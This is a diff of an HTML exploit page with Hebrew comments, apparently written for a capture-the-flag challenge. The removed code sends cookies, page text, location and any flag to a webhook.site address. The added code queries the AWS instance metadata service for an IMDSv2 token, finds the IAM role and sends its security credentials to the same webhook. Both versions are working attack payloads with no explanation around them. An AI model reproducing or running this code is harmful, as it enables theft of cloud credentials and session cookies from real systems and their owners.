@@ -1,54 +1,43 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Loading...</title>
+  <title>Running IMDS Exploit...</title>
 </head>
 <body>
-  <h1>Running Exploit...</h1>
-  <form id="exfil" action="https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d" method="POST">
-    <input type="hidden" name="document_title" id="document_title">
-    <input type="hidden" name="document_cookie" id="document_cookie">
-    <input type="hidden" name="document_body" id="document_body">
-    <input type="hidden" name="document_location" id="document_location">
-  </form>
-
+  <h1>Running IMDS Exploit...</h1>
   <script>
-    // פונקציית שליחה בטוחה
-    function send(name, data) {
-      const img = new Image();
-      img.src = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?' + name + '=' + encodeURIComponent(data);
-    }
-
-    // שליחה דרך form POST (אם fetch חסום)
-    function exfilForm(data) {
-      document.getElementById('document_title').value = document.title;
-      document.getElementById('document_cookie').value = document.cookie;
-      document.getElementById('document_body').value = document.body.innerText;
-      document.getElementById('document_location').value = location.href;
-      document.getElementById('exfil').submit();
-    }
-
-    try {
-      // שלח מידע בסיסי
-      send('title', document.title);
-      send('cookie', document.cookie);
-      send('location', location.href);
-
-      // נסה לשלוף דגל מתוך הדף
-      const flagLike = document.body.innerText.match(/CTF\{.*?\}/);
-      if (flagLike) {
-        send('flag', flagLike[0]);
-      } else {
-        // נסה לשלוח את כל הדף
-        send('html', document.documentElement.outerHTML);
+    // תחילה מבקשים token מ־IMDSv2
+    fetch("http://169.254.169.254/latest/api/token", {
+      method: "PUT",
+      headers: {
+        "X-aws-ec2-metadata-token-ttl-seconds": "21600"
       }
-
-      // נסה גם עם form POST
-      setTimeout(exfilForm, 1000);
-    } catch (e) {
-      send('error', e.toString());
-    }
+    })
+    .then(response => response.text())
+    .then(token => {
+      // עכשיו ניגשים ל־/latest/meta-data/ עם הטוקן
+      return fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/", {
+        method: "GET",
+        headers: {
+          "X-aws-ec2-metadata-token": token
+        }
+      });
+    })
+    .then(response => response.text())
+    .then(roleName => {
+      // עכשיו ניגש לפרטי ה־credentials עצמם
+      return fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/" + roleName)
+        .then(r => r.text());
+    })
+    .then(credentials => {
+      // שולחים את כל המידע ל־webhook שלך
+      new Image().src = "https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?imds=" + encodeURIComponent(credentials);
+    })
+    .catch(err => {
+      // אם משהו נכשל, שלח שגיאה
+      new Image().src = "https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?error=" + encodeURIComponent(err.message);
+    });
   </script>
 </body>
 </html>
